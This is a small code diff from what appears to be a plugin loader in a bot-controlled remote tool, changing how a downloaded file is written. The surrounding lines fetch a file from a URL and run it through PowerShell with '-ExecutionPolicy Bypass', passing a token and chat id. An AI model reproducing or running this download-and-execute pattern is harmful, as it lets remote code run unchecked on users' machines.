@@ -19,7 +19,7 @@ class Plugin():
 			file.close()
 			req = _.Request(url)
 			file = open(filename, "w")
-			file.write(req.content)
+			file.write(req.text)
 			file.close()
 			if self.plugins[self.plugin]["Extention"] == "PS1":
 				sub = subprocess.Popen(["powershell.exe","-ExecutionPolicy","Bypass","-File",filename,self.token, self.chat_id],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
